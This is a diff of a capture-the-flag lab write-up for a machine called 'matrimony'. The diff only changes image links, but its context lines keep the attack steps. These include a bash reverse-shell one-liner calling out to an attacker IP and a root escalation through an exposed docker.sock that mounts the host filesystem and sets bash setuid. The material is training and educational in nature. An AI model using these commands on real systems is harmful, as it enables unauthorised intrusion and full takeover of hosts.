@@ -22,7 +22,7 @@ DNS is open, so we likely need to find a domain name somewhere.
 
 Port 80 just shows us a static site:
 
-![](<../../../.gitbook/assets/image%20(3999).png>)
+![](../../../.gitbook/assets/matrimony-5.png)
 
 There wasn't anything interesting about this site, so I went back to DNS. Similar to HTB, some machines from PGP tend to have domain names we just enter into our `/etc/hosts` file. I entered a few like `matrimony.pg`, `matrimony.offsec` and `matrimony.off`.
 
@@ -52,7 +52,7 @@ It also finds another subdomain at `prod99`.
 
 The `prod99` domain shows us this marriage website:
 
-![](<../../../.gitbook/assets/image%20(1630).png>)
+![](../../../.gitbook/assets/matrimony-2.png)
 
 I created an account on the website and found that it runs on PHP. I checked around for exploits for 'matrim':
 
@@ -111,7 +111,7 @@ From here, we can easily get a reverse shell:
 $ bash -c 'bash -i >& /dev/tcp/192.168.45.189/21 0>&1'
 ```
 
-![](<../../../.gitbook/assets/image%20(556).png>)
+![](../../../.gitbook/assets/matrimony-6.png)
 
 ## Privilege Escalation
 
@@ -132,7 +132,7 @@ docker0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
 
 We can `ssh` into 172.17.0.2 as `root`:
 
-![](<../../../.gitbook/assets/image%20(3996).png>)
+![](../../../.gitbook/assets/matrimony-4.png)
 
 We can find the `docker.sock` file in both machines:
 
@@ -156,10 +156,10 @@ We can mount back onto the first image:
 ./docker -H unix:///run/docker.sock run -it -v /:/mnt 73aebf20ceb1 bash
 ```
 
-![](<../../../.gitbook/assets/image%20(1807).png>)
+![](../../../.gitbook/assets/matrimony-3.png)
 
 To get a `root` shell, simply run `chmod u+s /mnt/bin/bash`. Exit the docker container back onto the host machine and run `bash -p`:
 
-![](<../../../.gitbook/assets/image%20(1622).png>)
+![](../../../.gitbook/assets/matrimony-1.png)
 
 Rooted!
